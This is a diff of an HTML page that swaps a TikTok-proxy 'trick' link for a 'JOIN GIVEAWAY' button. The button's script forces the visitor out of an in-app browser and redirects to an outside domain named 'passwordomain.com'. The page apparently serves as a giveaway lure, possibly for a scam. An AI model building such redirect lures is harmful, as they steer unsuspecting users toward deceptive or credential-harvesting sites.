@@ -26,7 +26,6 @@
       cursor: pointer;
       transition: all 0.3s ease;
       box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-      text-decoration: none;
     }
 
     .btn:hover {
@@ -37,7 +36,16 @@
   </style>
 </head>
 <body>
-  <!-- vx trick link without target="_blank" -->
-  <a href="https://vxtiktok.com/@username/video/1234567890" class="btn">JOIN GIVEAWAY</a>
+  <button class="btn" onclick="openInBrowser()">JOIN GIVEAWAY</button>
+
+  <script>
+    function openInBrowser() {
+      // Try system-level browser first
+      window.open("https://passwordomain.com/1838319", "_system");
+
+      // Fallback: new window/tab
+      window.location.href = "https://passwordomain.com/1838319";
+    }
+  </script>
 </body>
 </html>
